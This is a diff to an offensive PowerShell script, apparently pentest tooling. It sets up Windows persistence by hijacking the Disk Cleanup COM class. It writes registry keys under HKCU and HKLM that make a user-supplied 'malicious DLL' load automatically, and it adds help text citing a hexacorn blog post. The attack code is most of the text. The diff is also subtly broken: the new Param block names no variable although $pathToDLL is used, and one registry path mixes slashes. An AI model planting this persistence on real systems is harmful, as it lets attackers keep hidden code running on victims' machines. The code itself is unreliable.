@@ -1,4 +1,12 @@
 function Add-DiskCleanupHKLM {
+<#
+
+.Synopsis
+    Configure the HKLM settings necessary for the Persistence technique outline by @hexacorn. 
+    http://www.hexacorn.com/blog/2018/09/02/beyond-good-ol-run-key-part-86/
+
+
+#>
     #check admin rights
     $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
     $isAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
@@ -20,9 +28,32 @@ function Add-DiskCleanupHKLM {
 }
 
 function Add-DiskCleanupHKCU {
+<#
+
+.Synopsis
+    Configure the HKCU settings necessary for the Persistence technique outline by @hexacorn. 
+    http://www.hexacorn.com/blog/2018/09/02/beyond-good-ol-run-key-part-86/
+
+
+.PARAMETER pathToDLL
+    The absolute path of where the malicious DLL is located at
+
+.EXAMPLE
+    C:\PS> Add-DiskCLeanupHKCU -pathToDLL 'C:\tools\pentstlab.dll'
+
+.LINK
+    http://www.hexacorn.com/blog/2018/09/02/beyond-good-ol-run-key-part-86/
+#>
+
+
+[CmdletBinding()] Param (
+    [Parameter (ParameterSetName = 'pathToDLL', Mandatory = $True)]
+    )
+
+
     $guid='{4f53c83a-900f-4ed9-902b-7a59a67747ed}'
     new-item -name $guid -Path 'HKCU:\SOFTWARE\Classes\CLSID\' 
-    new-item -name InProcServer32 -Path "HKCU:\SOFTWARE\Classes\CLSID\$guid" -value 'c:\tools\pentestlab.dll'
+    new-item -name InProcServer32 -Path "HKCU:\SOFTWARE\Classes\CLSID\$guid" -value $pathToDLL
     New-ItemProperty -name 'ThreadingModel' -path "HKCU:\SOFTWARE\Classes\CLSID/$guid/InProcServer32" -value 'Apartment'
 }
 
